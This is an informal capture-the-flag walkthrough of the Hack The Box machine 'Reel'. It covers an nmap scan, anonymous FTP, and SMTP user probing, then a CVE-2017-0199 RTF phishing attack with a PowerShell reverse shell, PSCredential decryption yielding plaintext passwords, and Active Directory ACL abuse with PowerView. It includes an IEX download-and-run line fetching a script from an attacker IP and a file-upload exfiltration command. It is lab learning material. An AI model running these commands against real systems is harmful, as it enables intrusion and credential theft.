soo ..... we begin with our nmap scan and we get this as the out put 

# Nmap 7.94 scan initiated Wed Jul 19 19:14:53 2023 as: nmap -p21,22,25,135,139,445 -Pn -sC -sV -oA reel 10.10.10.77
Nmap scan report for 10.10.10.77
Host is up (0.93s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         Microsoft ftpd
| ftp-syst: 
|   STAT: 215
|_Windows_NT
22/tcp  open  ssh         OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp  open  smtp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp open  msrpc       Microsoft Windows RPC
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp open  microso  Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.94%I=7%D=7/19%Time=64B80C05%P=x86_64-pc-linux-gnu%r(NULL
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S
SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%
SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH
SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"
SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer
SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq
SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2
SF:20\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20
SF:Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerbero
SF:s,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mai
SF:l\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20re
SF:ady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n");
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2023-07-19T17:17:13+01:00
|_clock-skew: mean: -29m50s, deviation: 42m11s, median: -59m40s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 19 19:18:14 2023 -- 1 IP address (1 host up) scanned in 201.12 seconds

so we see that  port 21 ftp is open.... we can begin by seeing if it allows anonymous login 
and wallah it does.... we seee a document containing Applocker.docx, Msf.doc and Windows\ Event\ Forwarding.docx 

so we suggest that the files were made using wordpad but not microsoft office as if we put a macro in office that pings back to our machine it gives us info that its a microsoft office doc made by office so we can't just add a macro containing the reverse shell that calls back to our machine in the microsoft office doc and expect things to be well... because it will not call back to our machine since it was made by wordpad... but on checking with exiftool we see that in the document called Windows Event Forwarding.docx it contains the email of a user <nico@megabank.com>  this is some crucial information we got here.....

on checking the applocker.docx file we see the info that 


AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.


this shows us that there are strict applocker policies in their network environment... so we have to be carefull in how we operate in it....

we check the msf.doc and we find out its empty...

and aparently the 'Windows Event Forwarding.docx' file is corrupt and therefore can't be opened.... libreoffice says so....


but its a good thing we obtained valuable information from the file.... 
 
so letscheck if really this email exists throught telnet 

MAIL FROM: <isaiah@hacktastic.com>
250 OK
RCPT TO:<nico@megabank.com>
250 OK
RCPT TO: <joan@megabank.com>
550 Unknown user

it definitely shows that there nico is a valid user...

cat readme.txt 
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.


thats what we get from the readme file... it shows us  that there is a possibility of doing a phishing attack with an rtf file... we will do the attack...  so... I look up for the rtf exploit and I find the exploit.... from Github so I clone the exploit on my machine 


and we successfully pull it off by using the cve to generate the rtf file and using Out-HTA.ps1 from nishang to create the hta file that in turn calls to our base64 encoded powershell payload... 

resources used.... revshells.com.... powershell base64 encoded payload....  to make the powershell base64 encoded payload... nishang Out-HTA.ps1 to generate the hta file  and the  https://github.com/bhdresh/CVE-2017-0199(to generate the rtf file)

now we have shell execution on the machine as user nico... the one who was doing the conversion... 

we go to the desktop directory of nico  and we view that there is a cred.xml file... so theres this PS object called PSCredential which provides method of storing username,passwords and credentials.... 

there is also 2 functions... Import-Clixml and Export-Clixml which are used to import these credentials and save them into a file...  respectively... so for this case this has been imported now we have to restore it using PSCredential object Export-Clixml 
so we import it using

$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | fl *

and we get:
UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB


Invoke-RestMethod -Method PUT -Uri "http://ipaddress/nameofile" -Body $output --- upload a file via nginx




Get-Service | where {$_.Status -eq "Running"} ---> whows services that are running in the machine... 

scp tom@10.10.10.77:C:/Users/tom/Desktop/'AD Audit'/BloodHound/Ingestors/acls.csv . --->useed to transfer the csv file  or use impacket smbserver to get the file on the victim pc


impacket-smbserver bh $(pwd) 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

then on the attacker machine
net use z:\\Ipaddress\<sharename>


then you can just copy the file on the share and you can later receive it on your attacker pc...

we then make the csv file readable on the terminal using cvstool...

cvstool readable acls.cvs > readable

after that we do 

head -1 && cat readable | grep -i tom 
we see that tom has write owner privileges over claire so.. we can 
set tom as the owner of claires acl.... give tom permission to change password on that acl... create powershell credentials and change credentials 

### Set tom as the owner of claireâ€™s ACL 
Set-DomainObjectOwner -identity claire -OwnerIdentity tom 

### Give tom permissions to change passwords on that ACL
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 

### Create powershell credential and change credentials. 
### NOTE!! IN A REAL PENTEST YOU WOULD ENABLE REVERSIBLE ENCRYPTION OR MAKE USER KERBEROSTABLE OR SOMETHING ELSE AND NOT CHANGE THE PASSWORD IN A PRODUCTION ENVIRONMENT
#####################
$username = "htb.local\claire"
$password = ConvertTo-SecureString "Isaiah!1234ASDF!@#$" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $cred
##############(add user to group remotely)


$cred = ConvertTo-SecureString "Isaiah!1234ASDF!@#$" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
 


so both writeowner privs and writedacl privs are genericwrite privs..... writedacl privs means the dude has privileges to write discretionary access control lists... which includes groups

$password = ConvertTo-SecureString "Isaiah!1234ASDF!@#$" -AsPlainText -Force

 In the Windows security model, the Discretionary Access Control List (DACL) is a list of access control entries (ACEs) that specify the permissions granted or denied to security principals (users, groups, or computers) on an object. The DACL is an essential component of an object's security descriptor and is used to enforce discretionary access control for the object.

Each ACE in the DACL contains information about a security principal (identified by its Security Identifier - SID) and the specific permissions granted or denied to that principal on the object. The permissions in the DACL define what actions can be taken by the security principals on the object. Here are some common permissions that are part of the DACL:

    Full Control: Allows the security principal to have full control over the object, including the ability to modify permissions and take ownership.

    Modify: Grants the security principal the ability to modify the object's attributes and properties.

    Read: Permits the security principal to view the object's attributes and properties.

    Write: Allows the security principal to write data to the object.

    Create Child Object: Grants the security principal the ability to create child objects within a container.

    Delete Child Object: Permits the security principal to delete child objects within a container.

    Delete: Allows the security principal to delete the object.

    List Contents: Allows the security principal to list the contents of a container object.

    Read Permissions: Grants the security principal the ability to read the object's permissions.

    Change Permissions: Permits the security principal to modify the object's permissions.

    Take Ownership: Allows the security principal to take ownership of the object, enabling them to change the object's security settings.

Each ACE in the DACL specifies whether the permission is allowed or denied for the corresponding security principal. When a security principal attempts to access the object, the system checks the DACL to determine whether the requested action is permitted or denied.



"generic write privileges" is a term used to describe a set of permissions that include the abilities to modify certain object attributes and modify the discretionary access control list (DACL) of the object. Both "WriteOwner" and "WriteDACL" are examples of permissions that fall under the umbrella of generic write privileges.

    WriteOwner Privilege: The "WriteOwner" privilege allows a user to modify the owner of an object, which means they can change the security principal that is designated as the owner of the object. The owner of an object has certain administrative rights over that object, and changing the owner can potentially grant additional control.

    WriteDACL Privilege: The "WriteDACL" privilege allows a user to modify the discretionary access control list (DACL) of an object. The DACL controls the permissions that specify which security principals (users, groups, or computers) are granted access to the object and what level of access they have.

Both WriteOwner and WriteDACL privileges are considered generic write privileges because they grant users the ability to modify certain aspects of an object's security settings. These privileges should be carefully controlled and limited to trusted administrators to prevent unauthorized modifications to sensitive objects and access control settings.

IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.29:80/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All



net group "Backup_Admins" /add claire ---> writeDacl privs 

well we had to add the user claire to the backup_admins group remotely... we were able to get a shell that way as claire.... then after getting the shell... we go to the admin folder and check and we see that we have administrative privileges... but when we try to get the root file we can't we are still denied accesss... then inside the folder we see backup_scri
pts folder which we interact with and check the scripts....  we find the admin password in there 
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"                                                                                                    

and then we ssh into the machine as the AD user... and get the root flag